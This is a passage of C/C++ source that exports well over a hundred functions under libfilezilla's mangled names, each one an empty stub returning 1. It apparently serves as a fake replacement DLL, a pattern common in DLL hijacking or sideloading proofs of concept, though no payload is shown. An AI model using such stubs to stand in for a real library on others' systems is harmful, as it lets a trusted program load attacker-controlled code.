BOOL WINAPI _ZN2fz7to_utf8B5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7trimmedB5cxx11ESt17basic_string_viewIcSt11char_traitsIcEERKS3_bb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz7trimmedB5cxx11ESt17basic_string_viewIwSt11char_traitsIwEERKS3_bb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime10imbue_timeEiiii() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime10set_rfc822ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime10set_rfc822ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime11set_rfc3339ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime11set_rfc3339ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime13verify_formatERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime13verify_formatERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime3nowEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime3setENS0_4zoneEiiiiiii() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime3setERK11_SYSTEMTIMENS0_8accuracyENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime3setERK9_FILETIMENS0_8accuracyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime3setERKSt17basic_string_viewIcSt11char_traitsIcEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime3setERKSt17basic_string_viewIwSt11char_traitsIwEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime5clearEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetime7clampedEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC1ENS0_4zoneEiiiiiii() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC1ERK9_FILETIMENS0_8accuracyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC1ERKSt17basic_string_viewIcSt11char_traitsIcEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC1ERKSt17basic_string_viewIwSt11char_traitsIwEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC1ExNS0_8accuracyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC2ENS0_4zoneEiiiiiii() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC2ERK9_FILETIMENS0_8accuracyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC2ERKSt17basic_string_viewIcSt11char_traitsIcEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC2ERKSt17basic_string_viewIwSt11char_traitsIwEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimeC2ExNS0_8accuracyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimemIERKNS_8durationE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8datetimepLERKNS_8durationE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8ltrimmedB5cxx11ESt17basic_string_viewIcSt11char_traitsIcEERKS3_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8ltrimmedB5cxx11ESt17basic_string_viewIwSt11char_traitsIwEERKS3_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8rtrimmedB5cxx11ESt17basic_string_viewIcSt11char_traitsIcEERKS3_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz8rtrimmedB5cxx11ESt17basic_string_viewIwSt11char_traitsIwEERKS3_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9condition4waitERNS_11scoped_lockE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9condition4waitERNS_11scoped_lockERKNS_8durationE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9condition6signalERNS_11scoped_lockE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9conditionC1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9conditionC2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9conditionD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9conditionD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer12generate_csrERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERKNS2_IcS3_IcESaIcEEERKSt6vectorISB_SaISB_EEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer13shutdown_readEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer15set_certificateERKSt17basic_string_viewIcSt11char_traitsIcEES6_RKNSt7__cxx1112basic_stringIwS2_IwESaIwEEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer15set_max_tls_verENS_7tls_verE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer15set_min_tls_verENS_7tls_verE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer16client_handshakeEPNS_13event_handlerERKSt6vectorIhSaIhEERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer16client_handshakeERKSt6vectorIhSaIhEES5_RKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer16list_tls_ciphersERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer16server_handshakeERKSt6vectorIhSaIhEERKSt17basic_string_viewIcSt11char_traitsIcEENS_16tls_server_flagsE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer17set_event_handlerEPNS_13event_handlerENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer18get_gnutls_versionB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer18new_session_ticketEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer20set_certificate_fileERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEES8_S8_b() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer23set_verification_resultEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer31generate_selfsigned_certificateERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERKNS2_IcS3_IcESaIcEEERKSt6vectorISB_SaISB_EE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer4readEPvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer5writeEPKvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer7connectERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEjNS_12address_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer8set_alpnERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer8set_alpnERKSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS7_EE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layer8shutdownEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layerC1ERNS_10event_loopEPNS_13event_handlerERNS_16socket_interfaceEPNS_22tls_system_trust_storeERNS_16logger_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layerC2ERNS_10event_loopEPNS_13event_handlerERNS_16socket_interfaceEPNS_22tls_system_trust_storeERNS_16logger_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layerD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9tls_layerclERKNS_10event_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9to_nativeB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9to_nativeB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9to_stringB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9to_stringB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9translateB5cxx11EPKc() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz9translateB5cxx11EPKcS1_x() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fzeqERKNS_13symmetric_keyES2_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fzmiERKNS_8datetimeES2_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fzmiERKNS_8durationES2_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fzneERKNS_13symmetric_keyES2_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fzplERKNS_8durationES2_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz10public_key9to_base64B5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz11private_key13shared_secretERKNS_10public_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz11private_key6pubkeyEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz11private_key9to_base64B5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz11socket_base10local_portERi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz11socket_base14address_familyEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz11socket_base8local_ipB5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz12query_string9to_stringB5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz13listen_socket9get_stateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz13symmetric_key3keyEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz13symmetric_key9to_base64B5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz19impersonation_token4hashEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz19impersonation_token4homeB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz19impersonation_token8usernameB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz19impersonation_tokeneqERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz19impersonation_tokenltERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz19private_signing_key6pubkeyEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz19private_signing_key9to_base64B5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz23public_verification_key9to_base64B5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz3uri11get_requestB5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz3uri13get_authorityB5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz3uri5emptyEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz3uri9to_stringB5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz3urieqERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4file4sizeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4file6openedEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4json10bool_valueEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4json12string_valueB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4json19number_value_doubleEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4json20number_value_integerEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4json8childrenEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4json9to_stringB5cxx11Eby() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4jsonixERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz4jsonixEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz6buffer7to_viewEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz6buffereqERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz6socket7peer_ipB5cxx11Eb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz6socket9get_stateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz6socket9peer_hostB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz6socket9peer_portERi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz6thread8joinableEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz7process6handleEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime10get_rfc822B5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime10get_time_tEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime12compare_slowERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime12get_filetimeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime5emptyEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime6formatERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime6formatERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime6get_tmENS0_4zoneE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetime7compareERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetimeeqERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetimeleERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz8datetimeltERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer10get_cipherB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer12get_hostnameB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer12get_protocolB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer15resumed_sessionEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer16get_key_exchangeB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer19get_raw_certificateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer22get_algorithm_warningsEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer22get_session_parametersEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer7get_macB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer8get_alpnB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer9get_stateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZNK2fz9tls_layer9is_serverEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz10event_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz11bucket_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz11socket_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz12rate_limiterE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz12socket_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz13listen_socketE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz14thread_invokerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz16recursive_removeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz16socket_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz18rate_limit_managerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz18rate_limited_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz19socket_event_sourceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz27compound_rate_limited_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz6bucketE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz6socketE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTIN2fz9tls_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz10event_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz11bucket_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz11socket_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz12rate_limiterE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz12socket_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz13listen_socketE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz14thread_invokerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz16recursive_removeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz16socket_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz18rate_limit_managerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz18rate_limited_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz19socket_event_sourceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz27compound_rate_limited_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz6bucketE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz6socketE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZTVN2fz9tls_layerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layer13shutdown_readEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layer17set_event_handlerEPNS_13event_handlerENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layer4readEPvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layer5writeEPKvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layer7connectERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEjNS_12address_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layer8shutdownEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_N2fz9tls_layerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn24_NK2fz9tls_layer9get_stateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn40_N2fz18rate_limited_layer6wakeupENS_9direction4typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn40_N2fz18rate_limited_layerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn40_N2fz18rate_limited_layerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz13listen_socketD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz13listen_socketD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socket13shutdown_readEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socket17set_event_handlerEPNS_13event_handlerENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socket4readEPvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socket5writeEPKvjRi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socket7connectERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEjNS_12address_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socket8shutdownEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socketD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_N2fz6socketD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_NK2fz6socket9get_stateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_NK2fz6socket9peer_hostB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZThn64_NK2fz6socket9peer_portERi() { return 1; }
